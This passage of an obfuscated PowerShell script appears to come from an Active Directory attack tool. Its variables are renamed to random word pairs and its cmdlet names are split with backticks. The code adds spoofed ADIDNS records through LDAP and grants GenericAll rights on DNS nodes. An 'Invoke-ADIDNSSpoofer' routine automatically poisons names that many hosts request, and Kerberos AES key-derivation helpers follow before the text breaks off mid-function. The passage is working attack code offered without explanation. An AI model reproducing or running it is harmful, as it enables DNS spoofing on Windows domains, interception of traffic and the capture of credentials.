            [parameter(Mandatory=$false)][ValidateSet("A","AAAA","CNAME","DNAME","MX","NS","PTR","SRV","TXT")][String]$EarBucket = "A",
            [parameter(Mandatory=$false)][String]$PersonCheer,
            [parameter(Mandatory=$false)][Byte[]]$StuffSnotty,
            [parameter(Mandatory=$false)][Int]$OvertKnit,
            [parameter(Mandatory=$false)][Int]$FemalePush,
            [parameter(Mandatory=$false)][Int]$CobwebNeedle,
            [parameter(Mandatory=$false)][Int]$SlipPorter,
            [parameter(Mandatory=$false)][Int]$LethalArrive = 600,
            [parameter(Mandatory=$false)][Int32]$SilkySelf,
            [parameter(Mandatory=$false)][Switch]$NailMixed,
            [parameter(Mandatory=$false)][Switch]$LiquidPetite,
            [parameter(Mandatory=$false)][System.Management.Automation.PSCredential]$Credential
        )

        $GaudySoothe = "DC=$FilmJazzy,DC=$PersonCheer,CN=MicrosoftDNS,DC=$CauseYoke"
        $BrickOwn = $DesireUnique.Split(".")

        foreach($NiceFree in $BrickOwn)
        {
            $GaudySoothe += ",DC=$NiceFree"
        }

        [Byte[]]$StuffSnotty = New-DNSRecordArray -IckyBloody $IckyBloody -TrickWander $TrickWander -EarBucket $EarBucket -LethalArrive $LethalArrive -PersonCheer $PersonCheer

        if($Credential)
        {
            $TownPack = ne`w-`obje`ct System.DirectoryServices.DirectoryEntry("LDAP://$TrickWander/$GaudySoothe",$Credential.UserName,$Credential.GetNetworkCredential().Password)
        }
        else
        {
            $TownPack = ne`w-`obje`ct System.DirectoryServices.DirectoryEntry "LDAP://$TrickWander/$GaudySoothe"
        }

        try
        {
            $TownPack.InvokeSet('dnsRecord',$StuffSnotty)
            $TownPack.SetInfo()
            $TailRotten = $true
            $LightOval.output_queue.Add("[!] [$(Get-Date -format s)] ADIDNS node $FilmJazzy added to $PersonCheer") > $null;
            $LightOval.ADIDNS_table.$FilmJazzy = "1"
        }
        catch
        {
            $TailRotten = $false
            $error_message = $_.Exception.Message
            $error_message = $error_message -replace "`n",""
            $LightOval.output_queue.Add("[!] [$(Get-Date -format s)] $error_message $($_.InvocationInfo.Line.Trim())") > $null
            $LightOval.ADIDNS_table.$FilmJazzy = "0"
        }

        if($TownPack.Path)
        {
            $TownPack.Close()
        }

        return $TailRotten
    }

    function Get-ADIDNSNodeTombstoned
    {

        [CmdletBinding()]
        param
        (
            [parameter(Mandatory=$false)][String]$ChiefRate,
            [parameter(Mandatory=$false)][String]$DesireUnique,
            [parameter(Mandatory=$false)][String]$TrickWander,
            [parameter(Mandatory=$true)][String]$FilmJazzy,
            [parameter(Mandatory=$false)][ValidateSet("DomainDNSZones","ForestDNSZones")][String]$CauseYoke = "DomainDNSZones",
            [parameter(Mandatory=$false)][String]$PersonCheer,
            [parameter(Mandatory=$false)][System.Management.Automation.PSCredential]$Credential
        )

        $GaudySoothe = "DC=$FilmJazzy,DC=$PersonCheer,CN=MicrosoftDNS,DC=$CauseYoke"
        $BrickOwn = $DesireUnique.Split(".")

        foreach($NiceFree in $BrickOwn)
        {
            $GaudySoothe += ",DC=$NiceFree"
        }

        if($Credential)
        {
            $TownPack = ne`w-`obje`ct System.DirectoryServices.DirectoryEntry("LDAP://$TrickWander/$GaudySoothe",$Credential.UserName,$Credential.GetNetworkCredential().Password)
        }
        else
        {
            $TownPack = ne`w-`obje`ct System.DirectoryServices.DirectoryEntry "LDAP://$TrickWander/$GaudySoothe"
        }

        try
        {
            $UnusedWool = $TownPack.InvokeGet('dnsTombstoned')
            $StuffSnotty = $TownPack.InvokeGet('dnsRecord')
        }
        catch
        {

            if($_.Exception.Message -notlike '*Exception calling "InvokeGet" with "1" argument(s): "The specified directory service attribute or value does not exist.*' -and
            $_.Exception.Message -notlike '*The following exception occurred while retrieving member "InvokeGet": "The specified directory service attribute or value does not exist.*')
            {
                $error_message = $_.Exception.Message
                $error_message = $error_message -replace "`n",""
                $LightOval.output_queue.Add("[!] [$(Get-Date -format s)] $error_message $($_.InvocationInfo.Line.Trim())") > $null
            }

        }

        if($TownPack.Path)
        {
            $TownPack.Close()
        }

        $NiceShape = $false

        if($UnusedWool -and $StuffSnotty)
        {

            if($StuffSnotty[0].GetType().name -eq [Byte])
            {

                if($StuffSnotty.Count -ge 32 -and $StuffSnotty[2] -eq 0)
                {
                    $NiceShape = $true
                }

            }

        }

        return $NiceShape
    }

    function Grant-ADIDNSPermission
    {
        [CmdletBinding()]
        param
        (
            [parameter(Mandatory=$false)][ValidateSet("AccessSystemSecurity","CreateChild","Delete","DeleteChild",
            "DeleteTree","ExtendedRight","GenericAll","GenericExecute","GenericRead","GenericWrite","ListChildren",
            "ListObject","ReadControl","ReadProperty","Self","Synchronize","WriteDacl","WriteOwner","WriteProperty")][Array]$CheapRob = "GenericAll",
            [parameter(Mandatory=$false)][ValidateSet("Allow","Deny")][String]$EarBucket = "Allow",    
            [parameter(Mandatory=$false)][String]$ChiefRate,
            [parameter(Mandatory=$false)][String]$DesireUnique,
            [parameter(Mandatory=$false)][String]$TrickWander,
            [parameter(Mandatory=$false)][String]$FilmJazzy,
            [parameter(Mandatory=$false)][ValidateSet("DomainDNSZones","ForestDNSZones","System")][String]$CauseYoke = "DomainDNSZones",
            [parameter(Mandatory=$false)][String]$PiesLearn,
            [parameter(Mandatory=$false)][String]$PersonCheer,
            [parameter(Mandatory=$false)][System.Management.Automation.PSCredential]$Credential,
            [parameter(ValueFromRemainingArguments=$true)]$TongueShrug
        )

        if($CauseYoke -eq 'System')
        {
            $GaudySoothe = "DC=$FilmJazzy,DC=$PersonCheer,CN=MicrosoftDNS,CN=$CauseYoke"
        }
        else
        {
            $GaudySoothe = "DC=$FilmJazzy,DC=$PersonCheer,CN=MicrosoftDNS,DC=$CauseYoke"
        }

        $BrickOwn = $DesireUnique.Split(".")

        ForEach($NiceFree in $BrickOwn)
        {
            $GaudySoothe += ",DC=$NiceFree"
        }

        if($Credential)
        {
            $TownPack = ne`w-`obje`ct System.DirectoryServices.DirectoryEntry("LDAP://$TrickWander/$GaudySoothe",$Credential.UserName,$Credential.GetNetworkCredential().Password)
        }
        else
        {
            $TownPack = ne`w-`obje`ct System.DirectoryServices.DirectoryEntry "LDAP://$TrickWander/$GaudySoothe"
        }

        try
        {
            $EqualWay = ne`w-`obje`ct System.Security.Principal.NTAccount($PiesLearn)
            $NeedScare = $EqualWay.Translate([System.Security.Principal.SecurityIdentifier])
            $VeinOffend = [System.Security.Principal.IdentityReference]$NeedScare
            $CurvyMint = [System.DirectoryServices.ActiveDirectoryRights]$CheapRob
            $StampTax = [System.Security.AccessControl.AccessControlType]$EarBucket
            $SparkBrick = [System.DirectoryServices.ActiveDirectorySecurityInheritance]"All"
            $SilkUse = ne`w-`obje`ct System.DirectoryServices.ActiveDirectoryAccessRule($VeinOffend,$CurvyMint,$StampTax,$SparkBrick)
        }
        catch
        {
            $error_message = $_.Exception.Message
            $error_message = $error_message -replace "`n",""
            $LightOval.output_queue.Add("[!] [$(Get-Date -format s)] $error_message $($_.InvocationInfo.Line.Trim())") > $null
        }

        try
        {
            $TownPack.psbase.ObjectSecurity.AddAccessRule($SilkUse)
            $TownPack.psbase.CommitChanges()
            $LightOval.output_queue.Add("[!] [$(Get-Date -format s)] Full Control ACE added for $PiesLearn to $FilmJazzy DACL") > $null
        }
        catch
        {
            $error_message = $_.Exception.Message
            $error_message = $error_message -replace "`n",""
            $LightOval.output_queue.Add("[!] [$(Get-Date -format s)] $error_message $($_.InvocationInfo.Line.Trim())") > $null
        }

        if($TownPack.Path)
        {
            $TownPack.Close()
        }

        return $TableSteam
    }
    
    function New-ADIDNSNode
    {
        [CmdletBinding()]
        param
        (
            [parameter(Mandatory=$false)][String]$IckyBloody,    
            [parameter(Mandatory=$false)][String]$ChiefRate,
            [parameter(Mandatory=$false)][String]$DesireUnique,
            [parameter(Mandatory=$false)][String]$TrickWander,
            [parameter(Mandatory=$false)][String]$RipeYoke,
            [parameter(Mandatory=$true)][String]$FilmJazzy,
            [parameter(Mandatory=$false)][ValidateSet("DomainDNSZones","ForestDNSZones")][String]$CauseYoke = "DomainDNSZones",
            [parameter(Mandatory=$false)][String]$EarBucket,
            [parameter(Mandatory=$false)][String]$PersonCheer,
            [parameter(Mandatory=$false)][Int]$LethalArrive,
            [parameter(Mandatory=$false)][System.Management.Automation.PSCredential]$Credential
        )

        $null = [System.Reflection.Assembly]::LoadWithPartialName("System.DirectoryServices.Protocols")

        $GaudySoothe = "DC=$FilmJazzy,DC=$PersonCheer,CN=MicrosoftDNS,DC=$CauseYoke"
        $BrickOwn = $DesireUnique.Split(".")

        foreach($NiceFree in $BrickOwn)
        {
            $GaudySoothe += ",DC=$NiceFree"
        }

        [Byte[]]$StuffSnotty = New-DNSRecordArray -IckyBloody $IckyBloody -TrickWander $TrickWander -EarBucket $EarBucket -LethalArrive $LethalArrive -PersonCheer $PersonCheer
        $FlapLovely = ne`w-`obje`ct System.DirectoryServices.Protocols.LdapDirectoryIdentifier($TrickWander,389)

        if($Credential)
        {
            $RoundFace = ne`w-`obje`ct System.DirectoryServices.Protocols.LdapConnection($FlapLovely,$Credential.GetNetworkCredential())
        }
        else
        {
            $RoundFace = ne`w-`obje`ct System.DirectoryServices.Protocols.LdapConnection($FlapLovely)
        }

        $object_category = "CN=Dns-FilmJazzy,CN=Schema,CN=Configuration"
        $JogAwake = $RipeYoke.Split(".")

        foreach($NiceFree in $JogAwake)
        {
            $object_category += ",DC=$NiceFree"
        }
        
        try
        {
            $RoundFace.SessionOptions.Sealing = $true
            $RoundFace.SessionOptions.Signing = $true
            $RoundFace.Bind()
            $RootSnail = ne`w-`obje`ct -TypeName System.DirectoryServices.Protocols.AddRequest
            $RootSnail.DistinguishedName = $GaudySoothe
            $RootSnail.Attributes.Add((ne`w-`obje`ct "System.DirectoryServices.Protocols.DirectoryAttribute" -ArgumentList "objectClass",@("top","dnsNode"))) > $null
            $RootSnail.Attributes.Add((ne`w-`obje`ct "System.DirectoryServices.Protocols.DirectoryAttribute" -ArgumentList "objectCategory",$object_category)) > $null
            $RootSnail.Attributes.Add((ne`w-`obje`ct "System.DirectoryServices.Protocols.DirectoryAttribute" -ArgumentList "dnsRecord",$StuffSnotty)) > $null
            $RootSnail.Attributes.Add((ne`w-`obje`ct "System.DirectoryServices.Protocols.DirectoryAttribute" -ArgumentList "dNSTombstoned","TRUE")) > $null
            $RoundFace.SendRequest($RootSnail) > $null
            $LightOval.output_queue.Add("[!] [$(Get-Date -format s)] ADIDNS node $FilmJazzy type $EarBucket added to $PersonCheer") > $null
            $TableSteam = $true
            $LightOval.ADIDNS_table.$FilmJazzy = "1"
        }
        catch
        {
            $error_message = $_.Exception.Message
            $error_message = $error_message -replace "`n",""
            $TableSteam = $false

            if($_.Exception.Message -ne 'Exception calling "SendRequest" with "1" argument(s): "The object exists."')
            {
                $LightOval.ADIDNS = $null
                $LightOval.output_queue.Add("[!] [$(Get-Date -format s)] $error_message $($_.InvocationInfo.Line.Trim())") > $null
                $LightOval.ADIDNS_table.$FilmJazzy = "0"
            }

        }

        return $TableSteam
    }

    function New-DonkeyFrail
    {

        [CmdletBinding()]
        param
        (
            [parameter(Mandatory=$false)][String]$TrickWander,
            [parameter(Mandatory=$false)][String]$PersonCheer
        )

        $PersonCheer = $PersonCheer.ToLower()

        function Convert-DataToUInt16($HeapShut)
        {
            [Array]::Reverse($HeapShut)
            return [System.BitConverter]::ToUInt16($HeapShut,0)
        }

        function ConvertFrom-PacketOrderedDictionary($ClassyThird)
        {

            foreach($HeapShut in $ClassyThird.Values)
            {
                $byte_array += $HeapShut
            }

            return $byte_array
        }

        function New-RandomByteArray
        {
            param([Int]$PlaceBook,[Int]$WoodWrist=1,[Int]$WallWish=255)

            [String]$ToothWave = [String](1..$PlaceBook | ForEach-Object {"{0:X2}" -f (Get-ToothWave -WoodWrist $WoodWrist -WallWish $WallWish)})
            [Byte[]]$ToothWave = $ToothWave.Split(" ") | ForEach-Object{[Char][System.Convert]::ToInt16($_,16)}

            return $ToothWave
        }

        function New-DNSNameArray
        {
            param([String]$Name)

            $NormalArch = $Name.ToCharArray()
            [Array]$MoveTicket = 0..($NormalArch.Count - 1) | Where-Object {$NormalArch[$_] -eq '.'}

            if($MoveTicket.Count -gt 0)
            {

                $name_start = 0

                foreach($ElatedCent in $MoveTicket)
                {
                    $name_end = $ElatedCent - $name_start
                    [Byte[]]$name_array += $name_end
                    [Byte[]]$name_array += [System.Text.Encoding]::UTF8.GetBytes($Name.Substring($name_start,$name_end))
                    $name_start = $ElatedCent + 1
                }

                [Byte[]]$name_array += ($Name.Length - $name_start)
                [Byte[]]$name_array += [System.Text.Encoding]::UTF8.GetBytes($Name.Substring($name_start))
            }
            else
            {
                [Byte[]]$name_array = $Name.Length
                [Byte[]]$name_array += [System.Text.Encoding]::UTF8.GetBytes($Name.Substring($name_start))
            }

            return $name_array
        }

        function New-PacketDNSSOAQuery
        {
            param([String]$Name)

            [Byte[]]$EarBucket = 0x00,0x06
            [Byte[]]$name = (New-DNSNameArray $Name) + 0x00
            [Byte[]]$PlaceBook = [System.BitConverter]::GetBytes($Name.Count + 16)[1,0]
            [Byte[]]$NimbleBrush = New-RandomByteArray 2
            $EndAbrupt = ne`w-`obje`ct System.Collections.Specialized.OrderedDictionary
            $EndAbrupt.Add("Length",$PlaceBook)
            $EndAbrupt.Add("TransactionID",$NimbleBrush)
            $EndAbrupt.Add("Flags",[Byte[]](0x01,0x00))
            $EndAbrupt.Add("Questions",[Byte[]](0x00,0x01))
            $EndAbrupt.Add("AnswerRRs",[Byte[]](0x00,0x00))
            $EndAbrupt.Add("AuthorityRRs",[Byte[]](0x00,0x00))
            $EndAbrupt.Add("AdditionalRRs",[Byte[]](0x00,0x00))
            $EndAbrupt.Add("Queries_Name",$name)
            $EndAbrupt.Add("Queries_Type",$EarBucket)
            $EndAbrupt.Add("Queries_Class",[Byte[]](0x00,0x01))

            return $EndAbrupt
        }

        $DesertWorry = ne`w-`obje`ct System.Net.Sockets.TCPClient
        $DesertWorry.Client.ReceiveTimeout = 3000

        try
        {
            $DesertWorry.Connect($TrickWander,"53")
            $ActAlert = $DesertWorry.GetStream()
            $EndAnts = ne`w-`obje`ct System.Byte[] 2048
            $TartSomber = New-PacketDNSSOAQuery $PersonCheer
            [Byte[]]$TourHealth = ConvertFrom-PacketOrderedDictionary $TartSomber
            $ActAlert.Write($TourHealth,0,$TourHealth.Length) > $null
            $ActAlert.Flush()   
            $ActAlert.Read($EndAnts,0,$EndAnts.Length) > $null
            $DesertWorry.Close()
            $ActAlert.Close()

            if($EndAnts[9] -eq 0)
            {
                $LightOval.output_queue.Add("[-] $PersonCheer SOA record not found") > $null
            }
            else
            {
                $UniqueRiver = [System.BitConverter]::ToString($EndAnts)
                $UniqueRiver = $UniqueRiver -replace "-",""
                $DrinkMisty = $UniqueRiver.IndexOf("C00C00060001")
                $DrinkMisty = $DrinkMisty / 2
                $CarveDusty = $EndAnts[($DrinkMisty + 10)..($DrinkMisty + 11)]
                $CarveDusty = Convert-DataToUInt16 $CarveDusty
                [Byte[]]$MistyValue = $EndAnts[($DrinkMisty + $CarveDusty - 8)..($DrinkMisty + $CarveDusty - 5)]
                $HairQuiet = [System.BitConverter]::ToUInt32($MistyValue[3..0],0) + 1
                [Byte[]]$DogsIcy = [System.BitConverter]::GetBytes($HairQuiet)[0..3]
            }

        }
        catch
        {
            $LightOval.output_queue.Add("[-] $TrickWander did not respond on TCP port 53") > $null
        }

        return [Byte[]]$DogsIcy
    }

    function New-DNSRecordArray
    {
        [CmdletBinding()]
        [OutputType([Byte[]])]
        param
        (
            [parameter(Mandatory=$false)][String]$IckyBloody,
            [parameter(Mandatory=$false)][String]$TrickWander,
            [parameter(Mandatory=$false)][ValidateSet("A","AAAA","CNAME","DNAME","MX","NS","PTR","SRV","TXT")][String]$EarBucket = "A",
            [parameter(Mandatory=$false)][String]$PersonCheer,
            [parameter(Mandatory=$false)][Int]$OvertKnit,
            [parameter(Mandatory=$false)][Int]$FemalePush,
            [parameter(Mandatory=$false)][Int]$CobwebNeedle,
            [parameter(Mandatory=$false)][Int]$SlipPorter,
            [parameter(Mandatory=$false)][Int]$LethalArrive = 600,
            [parameter(Mandatory=$false)][Int32]$SilkySelf,
            [parameter(Mandatory=$false)][Switch]$NailMixed,
            [parameter(ValueFromRemainingArguments=$true)]$TongueShrug
        )

        $DonkeyFrail = New-DonkeyFrail -TrickWander $TrickWander -PersonCheer $PersonCheer

        function New-DNSNameArray
        {
            param([String]$Name)

            $NormalArch = $Name.ToCharArray()
            [Array]$MoveTicket = 0..($NormalArch.Count - 1) | Where-Object {$NormalArch[$_] -eq '.'}

            if($MoveTicket.Count -gt 0)
            {

                $name_start = 0

                foreach($ElatedCent in $MoveTicket)
                {
                    $name_end = $ElatedCent - $name_start
                    [Byte[]]$name_array += $name_end
                    [Byte[]]$name_array += [System.Text.Encoding]::UTF8.GetBytes($Name.Substring($name_start,$name_end))
                    $name_start = $ElatedCent + 1
                }

                [Byte[]]$name_array += ($Name.Length - $name_start)
                [Byte[]]$name_array += [System.Text.Encoding]::UTF8.GetBytes($Name.Substring($name_start))
            }
            else
            {
                [Byte[]]$name_array = $Name.Length
                [Byte[]]$name_array += [System.Text.Encoding]::UTF8.GetBytes($Name.Substring($name_start))
            }

            return $name_array
        }

        switch ($EarBucket)
        {

            'A'
            {
                [Byte[]]$FlightNeedle = 0x01,0x00
                [Byte[]]$RabbitEmploy = ([System.BitConverter]::GetBytes(($IckyBloody.Split(".")).Count))[0..1]
                [Byte[]]$NoteEar += ([System.Net.IPAddress][String]([System.Net.IPAddress]$IckyBloody)).GetAddressBytes()
            }

            'AAAA'
            {
                [Byte[]]$FlightNeedle = 0x1c,0x00
                [Byte[]]$RabbitEmploy = ([System.BitConverter]::GetBytes(($IckyBloody -replace ":","").Length / 2))[0..1]
                [Byte[]]$NoteEar += ([System.Net.IPAddress][String]([System.Net.IPAddress]$IckyBloody)).GetAddressBytes()
            }
            
            'CNAME'
            {
                [Byte[]]$FlightNeedle = 0x05,0x00
                [Byte[]]$RabbitEmploy = ([System.BitConverter]::GetBytes($IckyBloody.Length + 4))[0..1]
                [Byte[]]$NoteEar = $IckyBloody.Length + 2
                $NoteEar += ($IckyBloody.Split(".")).Count
                $NoteEar += New-DNSNameArray $IckyBloody
                $NoteEar += 0x00
            }

            'DNAME'
            {
                [Byte[]]$FlightNeedle = 0x27,0x00
                [Byte[]]$RabbitEmploy = ([System.BitConverter]::GetBytes($IckyBloody.Length + 4))[0..1]
                [Byte[]]$NoteEar = $IckyBloody.Length + 2
                $NoteEar += ($IckyBloody.Split(".")).Count
                $NoteEar += New-DNSNameArray $IckyBloody
                $NoteEar += 0x00
            }
            
            'MX'
            {
                [Byte[]]$FlightNeedle = 0x0f,0x00
                [Byte[]]$RabbitEmploy = ([System.BitConverter]::GetBytes($IckyBloody.Length + 6))[0..1]
                [Byte[]]$NoteEar = [System.Bitconverter]::GetBytes($OvertKnit)[1,0]
                $NoteEar += $IckyBloody.Length + 2
                $NoteEar += ($IckyBloody.Split(".")).Count
                $NoteEar += New-DNSNameArray $IckyBloody
                $NoteEar += 0x00
            }

            'NS'
            {
                [Byte[]]$FlightNeedle = 0x02,0x00
                [Byte[]]$RabbitEmploy = ([System.BitConverter]::GetBytes($IckyBloody.Length + 4))[0..1]
                [Byte[]]$NoteEar = $IckyBloody.Length + 2
                $NoteEar += ($IckyBloody.Split(".")).Count
                $NoteEar += New-DNSNameArray $IckyBloody
                $NoteEar += 0x00
            }

            'PTR'
            {
                [Byte[]]$FlightNeedle = 0x0c,0x00
                [Byte[]]$RabbitEmploy = ([System.BitConverter]::GetBytes($IckyBloody.Length + 4))[0..1]
                [Byte[]]$NoteEar = $IckyBloody.Length + 2
                $NoteEar += ($IckyBloody.Split(".")).Count
                $NoteEar += New-DNSNameArray $IckyBloody
                $NoteEar += 0x00
            }

            'SRV'
            {
                [Byte[]]$FlightNeedle = 0x21,0x00
                [Byte[]]$RabbitEmploy = ([System.BitConverter]::GetBytes($IckyBloody.Length + 10))[0..1]
                [Byte[]]$NoteEar = [System.Bitconverter]::GetBytes($FemalePush)[1,0]
                $NoteEar += [System.Bitconverter]::GetBytes($CobwebNeedle)[1,0]
                $NoteEar += [System.Bitconverter]::GetBytes($SlipPorter)[1,0]
                $NoteEar += $IckyBloody.Length + 2
                $NoteEar += ($IckyBloody.Split(".")).Count
                $NoteEar += New-DNSNameArray $IckyBloody
                $NoteEar += 0x00
            }

            'TXT'
            {
                [Byte[]]$FlightNeedle = 0x10,0x00
                [Byte[]]$RabbitEmploy = ([System.BitConverter]::GetBytes($IckyBloody.Length + 1))[0..1]
                [Byte[]]$NoteEar = $IckyBloody.Length
                $NoteEar += [System.Text.Encoding]::UTF8.GetBytes($IckyBloody)
            }

        }
        
        [Byte[]]$RabbitStreet = [System.BitConverter]::GetBytes($LethalArrive)
        [Byte[]]$PlacidHorn = $RabbitEmploy +
            $FlightNeedle +
            0x05,0xF0,0x00,0x00 +
            $DonkeyFrail[0..3] +
            $RabbitStreet[3..0] +
            0x00,0x00,0x00,0x00

        if($NailMixed)
        {
            $PlacidHorn += 0x00,0x00,0x00,0x00
        }
        else
        {
            $KnockHusky = [Int64](([Datetime]::UtcNow)-(Get-Date "1/1/1601")).TotalHours
            $KnockHusky = [System.BitConverter]::ToString([System.BitConverter]::GetBytes($KnockHusky))
            $KnockHusky = $KnockHusky.Split("-") | ForEach-Object{[System.Convert]::ToInt16($_,16)}
            $KnockHusky = $KnockHusky[0..3]
            $PlacidHorn += $KnockHusky
        }
        
        $PlacidHorn += $NoteEar

        return ,$PlacidHorn
    }

    function Invoke-ADIDNSSpoofer
    {
        [CmdletBinding()]
        param
        (
            [parameter(Mandatory=$false)][String]$IckyBloody,
            [parameter(Mandatory=$false)][String]$DesireUnique,
            [parameter(Mandatory=$false)][String]$TrickWander,
            [parameter(Mandatory=$false)][String]$RipeYoke,
            [parameter(Mandatory=$true)][String]$FilmJazzy,
            [parameter(Mandatory=$false)][String]$CauseYoke,
            [parameter(Mandatory=$false)][String]$EarBucket,
            [parameter(Mandatory=$false)][String]$PersonCheer,
            [parameter(Mandatory=$false)][Int]$LethalArrive,
            [parameter(Mandatory=$false)][System.Management.Automation.PSCredential]$Credential
        )

        try
        {
            $MarchFork = New-ADIDNSNode -Credential $Credential -IckyBloody $IckyBloody -DesireUnique $DesireUnique -TrickWander $TrickWander -RipeYoke $RipeYoke -FilmJazzy $FilmJazzy -CauseYoke $CauseYoke -EarBucket $EarBucket -LethalArrive $LethalArrive -PersonCheer $PersonCheer

            if($LightOval.ADIDNS -and !$MarchFork)
            {
                $NiceShape = Get-ADIDNSNodeTombstoned -Credential $Credential -DesireUnique $DesireUnique -TrickWander $TrickWander -FilmJazzy $FilmJazzy -CauseYoke $CauseYoke -PersonCheer $PersonCheer

                if($NiceShape)
                {
                    Enable-ADIDNSNode -Credential $Credential -IckyBloody $IckyBloody -DesireUnique $DesireUnique -TrickWander $TrickWander -FilmJazzy $FilmJazzy -CauseYoke $CauseYoke -EarBucket $EarBucket -LethalArrive $LethalArrive -PersonCheer $PersonCheer
                }

            }

        }
        catch
        {
            $error_message = $_.Exception.Message
            $error_message = $error_message -replace "`n",""
            $LightOval.output_queue.Add("[!] [$(Get-Date -format s)] $error_message $($_.InvocationInfo.Line.Trim())") > $null
            $LightOval.output_queue.Add("[!] [$(Get-Date -format s)] ADIDNS spoofer disabled due to error") > $null
            $LightOval.ADIDNS = $null
        }

    }

    function Invoke-ADIDNSCheck
    {
        [CmdletBinding()]
        param
        (
            [parameter(Mandatory=$false)][Array]$MuscleFair,
            [parameter(Mandatory=$false)][String]$IckyBloody,
            [parameter(Mandatory=$false)][String]$DesireUnique,
            [parameter(Mandatory=$false)][String]$TrickWander,
            [parameter(Mandatory=$false)][String]$RipeYoke,
            [parameter(Mandatory=$false)]$CauseYoke,
            [parameter(Mandatory=$false)][String]$PersonCheer,
            [parameter(Mandatory=$false)][Int]$DrainCable,
            [parameter(Mandatory=$false)][Int]$LethalArrive,
            [parameter(Mandatory=$false)]$IrateAnimal,
            [parameter(Mandatory=$false)][System.Management.Automation.PSCredential]$Credential
        )

        Start-Sleep -PlantsIrate 1

        foreach($RootSnail in $IrateAnimal.Keys)
        {

            if(($IrateAnimal.$RootSnail | Sort-Object -Unique).Count -gt $DrainCable)
            {

                if(!$LightOval.ADIDNS_table.ContainsKey($RootSnail))
                {
                    $LightOval.ADIDNS_table.Add($RootSnail,"")
                }
                
                if($MuscleFair -NotContains $RootSnail -and !$LightOval.ADIDNS_table.$RootSnail)
                {    
                    Invoke-ADIDNSSpoofer -Credential $Credential -IckyBloody $IckyBloody -DesireUnique $DesireUnique -TrickWander $TrickWander -RipeYoke $RipeYoke -FilmJazzy $RootSnail -CauseYoke $CauseYoke -EarBucket 'A' -LethalArrive $LethalArrive -PersonCheer $PersonCheer
                }
                elseif($MuscleFair -Contains $RootSnail)
                {

                    if(!$LightOval.ADIDNS_table.$RootSnail)
                    {
                        $LightOval.output_queue.Add("[+] [$(Get-Date -format s)] ADIDNS combo attack ignored $RootSnail") > $null
                        $LightOval.ADIDNS_table.$RootSnail = 3
                    }

                }

            }
            
            Start-Sleep -m 10
        }

    }

}

# Microsoft".
$OrangeMushy = 
{

    function Get-KerberosAES256BaseKey
    {
        param([String]$TurkeyRacial,[System.Security.SecureString]$StripHill)

        $ViewDry = [System.Runtime.InteropServices.Marshal]::SecureStringToBSTR($StripHill)
        $AbsurdFierce = [System.Runtime.InteropServices.Marshal]::PtrToStringAuto($ViewDry)
        [Byte[]]$TurkeyRacial = [System.Text.Encoding]::UTF8.GetBytes($TurkeyRacial)
        [Byte[]]$AbsurdFierce = [System.Text.Encoding]::UTF8.GetBytes($AbsurdFierce)
        $ObeseSoda = 0x6B,0x65,0x72,0x62,0x65,0x72,0x6F,0x73,0x7B,0x9B,0x5B,0x2B,0x93,0x13,0x2B,0x93,0x5C,0x9B,0xDC,0xDA,0xD9,0x5C,0x98,0x99,0xC4,0xCA,0xE4,0xDE,0xE6,0xD6,0xCA,0xE4
        $FarmGroup = ne`w-`obje`ct Security.Cryptography.Rfc2898DeriveBytes($AbsurdFierce,$TurkeyRacial,4096)
        Remove-Variable password_cleartext
        $EmptyCrazy = $FarmGroup.GetBytes(32)
        $MightySpooky = ne`w-`obje`ct "System.Security.Cryptography.AesManaged"
        $MightySpooky.Mode = [System.Security.Cryptography.CipherMode]::CBC
        $MightySpooky.Padding = [System.Security.Cryptography.PaddingMode]::None
        $MightySpooky.IV = 0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00
        $MightySpooky.KeySize = 256
        $MightySpooky.Key = $EmptyCrazy
        $PoisedObese = $MightySpooky.CreateEncryptor()
        $LyingSlim = $PoisedObese.TransformFinalBlock($ObeseSoda,0,$ObeseSoda.Length)
        $DelayCloth = $PoisedObese.TransformFinalBlock($LyingSlim,0,$LyingSlim.Length)
        $UtterBang = $LyingSlim[0..15] + $DelayCloth[0..15]

        return $UtterBang
    }

    function Get-KerberosAES256UsageKey
    {
        param([String]$VestFlow,[Int]$CountBrush,[Byte[]]$UtterBang)

        $GrubbyHusky = 0x00 * 16

        if($VestFlow -eq 'checksum')
        {
            switch($CountBrush) 
            {
                25 {[Byte[]]$ToughBaby = 0x5d,0xfb,0x7d,0xbf,0x53,0x68,0xce,0x69,0x98,0x4b,0xa5,0xd2,0xe6,0x43,0x34,0xba + $GrubbyHusky}
            }
        }
        elseif($VestFlow -eq 'encrypt')
        {

            switch($CountBrush) 
            {
                1 {[Byte[]]$ToughBaby = 0xae,0x2c,0x16,0x0b,0x04,0xad,0x50,0x06,0xab,0x55,0xaa,0xd5,0x6a,0x80,0x35,0x5a + $GrubbyHusky}
                2 {[Byte[]]$ToughBaby = 0xb5,0xb0,0x58,0x2c,0x14,0xb6,0x50,0x0a,0xad,0x56,0xab,0x55,0xaa,0x80,0x55,0x6a + $GrubbyHusky}
                3 {[Byte[]]$ToughBaby = 0xbe,0x34,0x9a,0x4d,0x24,0xbe,0x50,0x0e,0xaf,0x57,0xab,0xd5,0xea,0x80,0x75,0x7a + $GrubbyHusky}
                4 {[Byte[]]$ToughBaby = 0xc5,0xb7,0xdc,0x6e,0x34,0xc7,0x51,0x12,0xb1,0x58,0xac,0x56,0x2a,0x80,0x95,0x8a + $GrubbyHusky}
                7 {[Byte[]]$ToughBaby = 0xde,0x44,0xa2,0xd1,0x64,0xe0,0x51,0x1e,0xb7,0x5b,0xad,0xd6,0xea,0x80,0xf5,0xba + $GrubbyHusky}
                11 {[Byte[]]$ToughBaby = 0xfe,0x54,0xaa,0x55,0xa5,0x02,0x52,0x2f,0xbf,0x5f,0xaf,0xd7,0xea,0x81,0x75,0xfa + $GrubbyHusky}
                12 {[Byte[]]$ToughBaby = 0x05,0xd7,0xec,0x76,0xb5,0x0b,0x53,0x33,0xc1,0x60,0xb0,0x58,0x2a,0x81,0x96,0x0b + $GrubbyHusky}
                14 {[Byte[]]$ToughBaby = 0x15,0xe0,0x70,0xb8,0xd5,0x1c,0x53,0x3b,0xc5,0x62,0xb1,0x58,0xaa,0x81,0xd6,0x2b + $GrubbyHusky}
            }
                
        }
        elseif($VestFlow -eq 'integrity') 
        {
            
            switch($CountBrush) 
            {
                1 {[Byte[]]$ToughBaby = 0x5b,0x58,0x2c,0x16,0x0a,0x5a,0xa8,0x05,0x56,0xab,0x55,0xaa,0xd5,0x40,0x2a,0xb5 + $GrubbyHusky}
